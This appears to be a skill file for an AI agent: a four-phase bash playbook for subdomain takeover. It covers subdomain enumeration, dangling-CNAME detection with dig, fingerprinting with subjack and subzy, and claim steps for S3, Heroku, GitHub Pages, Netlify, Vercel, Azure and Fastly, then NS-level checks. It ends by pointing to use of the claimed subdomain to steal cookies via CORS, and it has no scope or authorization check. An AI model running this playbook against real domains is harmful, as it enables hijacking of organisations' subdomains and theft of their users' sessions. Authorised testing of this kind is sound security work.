---
name: vuln-subdomain-takeover
description: "Subdomain takeover testing — dangling CNAME detection, cloud service fingerprinting, GitHub Pages takeover, S3 bucket takeover, Heroku/Netlify/Vercel claim, NS takeover. Triggers: 'subdomain takeover', 'dangling dns', 'cname takeover', 'domain takeover', 'dns takeover', 'cloud subdomain takeover', 's3 takeover', 'github pages takeover', 'dangling cname'."
---

# Subdomain Takeover Testing

Claim unclaimed cloud/CDN resources pointed to by dangling DNS records.

---

## Phase 1: CNAME Enumeration

```bash
TARGET="target.com"

# Enumerate subdomains:
subfinder -d "$TARGET" -all -silent | anew output/subdomains.txt
amass enum -passive -d "$TARGET" >> output/subdomains.txt
sort -u output/subdomains.txt -o output/subdomains.txt

# Find subdomains with CNAME records:
while IFS= read -r SUB; do
  CNAME=$(dig CNAME +short "$SUB" 2>/dev/null)
  [ -n "$CNAME" ] && echo "$SUB → CNAME: $CNAME"
done < output/subdomains.txt | tee output/cname_records.txt

# Check for dangling CNAMEs (NXDOMAIN at CNAME target):
while IFS= read -r LINE; do
  SUB=$(echo "$LINE" | awk '{print $1}')
  CNAME=$(echo "$LINE" | awk '{print $4}')
  CNAME_STATUS=$(dig A +short "$CNAME" 2>/dev/null)
  [ -z "$CNAME_STATUS" ] && echo "DANGLING: $SUB → $CNAME"
done < output/cname_records.txt | tee output/dangling_cnames.txt
```

---

## Phase 2: Service Fingerprinting

```bash
# Install subjack or subzy:
go install github.com/haccer/subjack@latest 2>/dev/null
go install github.com/PentestPad/subzy@latest 2>/dev/null

# Automated takeover detection:
subjack -w output/subdomains.txt -t 100 -timeout 30 \
  -ssl -a -m -o output/subjack_results.txt 2>&1

subzy run --targets output/subdomains.txt \
  --output output/subzy_results.txt 2>&1

# Manual fingerprinting — check HTTP response from dangling subdomain:
while IFS= read -r SUB; do
  RESP=$(curl -s -H "Host: $SUB" "http://$SUB/" --connect-timeout 5 2>/dev/null | head -5)
  echo "=== $SUB ==="
  echo "$RESP"
done < output/dangling_cnames.txt | tee output/takeover_fingerprints.txt
```

---

## Phase 3: Exploitation

```bash
# Common fingerprints and claim process:

# GitHub Pages:
# "There isn't a GitHub Pages site here" → claim via github.com → repository → Settings → Pages
# curl -s "http://dangling.target.com" | grep -i "github"

# Amazon S3:
# "NoSuchBucket" → aws s3api create-bucket --bucket dangling-target-com --region us-east-1
# curl -s "http://dangling.target.com" | grep -i "NoSuchBucket"

# Heroku:
# "No such app" → heroku create dangling-target-app
# curl -s "http://dangling.target.com" | grep -i "heroku\|no such app"

# Netlify:
# "Not Found" + Netlify headers → claim on netlify.com
# curl -s -I "http://dangling.target.com" | grep -i "netlify"

# Vercel:
# "The deployment could not be found" → vercel claim
# curl -s "http://dangling.target.com" | grep -i "vercel"

# Azure:
# "404 Web Site not found" → claim Azure Web App
# curl -s "http://dangling.target.com" | grep -i "azure"

# Fastly:
# "Fastly error: unknown domain" → register in Fastly
# curl -s "http://dangling.target.com" | grep -i "fastly"

# PoC — serve content from claimed subdomain:
echo "Subdomain takeover PoC at $(date)" > /tmp/index.html
# Upload to claimed resource, prove control
```

---

## Phase 4: NS-Level Takeover

```bash
TARGET="target.com"

# Check for delegated NS pointing to unclaimed nameserver:
while IFS= read -r SUB; do
  NS=$(dig NS +short "$SUB" 2>/dev/null)
  if [ -n "$NS" ]; then
    # Check if NS domain is expired/available:
    echo "$SUB NS: $NS"
    whois "$(echo $NS | head -1)" | grep -iE "expir|status|available"
  fi
done < output/subdomains.txt | tee output/ns_takeover.txt
```

---

## Output

Save to `output/`:
- `dangling_cnames.txt` — dangling CNAME records
- `subjack_results.txt` / `subzy_results.txt` — automated takeover findings
- `takeover_poc.txt` — proof of control over claimed subdomain

## Next Phase

→ Use claimed subdomain to steal cookies via CORS
→ `vuln-cors` if claimed subdomain is trusted origin
